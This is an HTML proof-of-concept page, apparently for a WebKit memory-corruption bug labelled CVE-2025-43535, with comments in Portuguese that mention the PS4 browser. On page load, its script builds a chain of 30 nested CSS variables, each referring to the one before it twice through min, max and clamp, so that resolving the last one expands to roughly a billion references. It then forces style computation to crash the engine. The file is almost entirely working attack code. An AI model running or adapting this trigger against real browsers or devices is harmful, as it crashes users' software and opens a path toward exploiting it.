<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>CVE-2025-43535 PoC — CSS Var Compression</title>
<style>
  body { background:#0a0a0a; color:#88ff88; font-family:monospace; padding:16px; }
  #log { background:#111; border:1px solid #88ff88; padding:12px;
         height:320px; overflow-y:auto; font-size:12px; }
  .ok{color:#00ff88} .fail{color:#ff4444} .info{color:#ffbb00} .crash{color:#ff00ff;font-weight:bold}
</style>
</head>
<body>
<h3>CVE-2025-43535 — Memory Corruption (CSS Var Expansion)</h3>
<div id="log"></div>

<script>
"use strict";

const L=(m,c)=>{const d=document.getElementById('log');
  d.innerHTML+=`<div class="${c||'info'}">[${Date.now()%100000}] ${m}</div>`;
  d.scrollTop=d.scrollHeight;
};

const yieldGC = () => new Promise(r => setTimeout(r, 100));

async function trigger_css_var_expansion() {
  L("[V1] Iniciando Expansão por Variáveis CSS...");

  const el = document.createElement('div');
  el.style.position = 'absolute';
  document.body.appendChild(el);

  // Define a base
  el.style.setProperty('--v0', '15px');

  // Nível 30 de expansão = 2^30 referências (Mais de 1 bilhão de nós no C++)
  // O JavaScript gasta zero memória pra montar isso.
  const max_depth = 30; 

  L(`[V1] Montando a cadeia de referências até o nível ${max_depth}...`);
  for (let i = 1; i <= max_depth; i++) {
    // Cada variável chama a anterior duas vezes. 
    // Ex: --v5 será min(var(--v4), var(--v4))
    const prev = `var(--v${i-1})`;
    
    // Alternamos as funções matemáticas para manter a complexidade do parser
    const funcs = ['min', 'max', 'clamp'];
    const f = funcs[i % 3];
    
    let expr = '';
    if (f === 'clamp') {
      expr = `clamp(${prev}, ${i * 5}px, ${prev})`;
    } else {
      expr = `${f}(${prev}, ${prev})`;
    }

    el.style.setProperty(`--v${i}`, expr);
  }

  L("[V1] Cadeia de variáveis montada no DOM. Tamanho no JS: Irrisório.", "ok");
  await yieldGC();

  L("[V1] ATENÇÃO: Disparando o gatilho no C++ do WebKit...");
  await new Promise(r => requestAnimationFrame(r));

  try {
    // O momento da verdade. O Style Resolver do PS4 vai tentar calcular --v30
    el.style.width = `var(--v${max_depth})`;
    
    // Força o cálculo síncrono
    void el.offsetWidth; 
    
    L(`[V1] Sobreviveu à expansão máxima!`, "ok");
  } catch(e) {
    L(`[V1] Erro na resolução: ${e}`, "fail");
  }

  document.body.removeChild(el);
  L("[V1] Teste de expansão finalizado.", "ok");
}

async function main() {
  try {
    await trigger_css_var_expansion();
    L("=== FIM DA EXECUÇÃO ===", "ok");
  } catch(e) {
    L("EXCEÇÃO FATAL: " + e.toString(), "fail");
  }
}

window.addEventListener('load', () => setTimeout(main, 500));
</script>
</body>
</html>
